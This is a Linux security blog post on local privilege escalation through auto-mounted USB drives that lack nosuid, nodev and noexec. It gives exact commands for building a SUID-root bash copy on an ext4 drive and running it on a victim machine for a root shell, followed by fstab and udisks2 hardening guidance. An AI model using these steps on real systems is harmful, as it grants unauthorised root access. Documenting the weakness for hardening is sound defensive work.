---
title: "Linux Local Privilege Escalation via Removable Media and Insecure Mount Options"
date: 2015-07-05T22:41:43+00:00
url: "/removable-disk-could-lead-to-privilege-escalation/"
draft: false
description: "How auto-mounted removable USB drives and external filesystems without nosuid and noexec mount options allow local privilege escalation on Linux systems."
categories: ["Linux", "Security"]
tags: ["linux", "privilege-escalation", "suid", "mount-options", "security-hardening", "sysadmin"]
---

When external USB flash drives or external storage media are plugged into desktop Linux distributions, automated desktop daemons (like `udisks2` or automount rules) often mount them automatically.

If the filesystem is mounted without explicit security constraints, an unprivileged user or malicious physical actor can escalate to root privileges instantly using pre-configured SUID binaries.

---

### The Attack Vector: SUID Preservation on Portable Filesystems

POSIX filesystems (such as `ext4`, `ext3`, `xfs`) store Unix file permissions—including the **SetUID (`suid`) bit** (`chmod 4755`) and file ownership—directly inside the filesystem's inode tables.

If an attacker prepares a USB drive on their personal machine where they have root access:

1. **Format a USB partition with `ext4`:**
   ```bash
   sudo mkfs.ext4 /dev/sdX1
   sudo mount /dev/sdX1 /mnt/usb
   ```

2. **Copy a shell or binary and set the SUID root bit:**
   ```bash
   sudo cp /bin/bash /mnt/usb/rootbash
   sudo chown root:root /mnt/usb/rootbash
   sudo chmod 4755 /mnt/usb/rootbash
   sudo umount /mnt/usb
   ```

3. **Insert the USB into the target victim Linux machine:**
   When the target system mounts `/dev/sdX1` at `/media/usb` without restrictive flags, any low-privileged user executing the binary inherits root privileges:

   ```bash
   /media/usb/rootbash -p
   # whoami -> root
   ```

---

### Remediation: Enforcing `nosuid`, `nodev`, and `noexec`

To eliminate this vulnerability, all dynamic and removable media mount configurations must strictly enforce three mount flags:

| Mount Flag | Security Function |
| :--- | :--- |
| **`nosuid`** | Disables SetUID and SetGID bits on the mounted filesystem. Even if a file is owned by root with `4755`, it executes with standard invoking user permissions. |
| **`nodev`** | Prevents the kernel from interpreting character or block special device files on the partition. |
| **`noexec`** | Completely prohibits direct execution of binaries from the partition. |

#### Example Hardened `/etc/fstab` Entry:
```text
/dev/sdb1    /mnt/removable    ext4    defaults,nosuid,nodev,noexec    0 0
```

#### Hardening Desktop Automount (`udisks2`)
For systems using modern desktop environments, configure UDisks rules under `/etc/udisks2/mount_options.conf`:

```ini
[defaults]
allow=exec,noexec,nodev,nosuid,atime,noatime,nodiratime,ro,rw,sync,dirsync,utf8
```
Ensure `nosuid` and `nodev` are default parameters for all external storage devices.
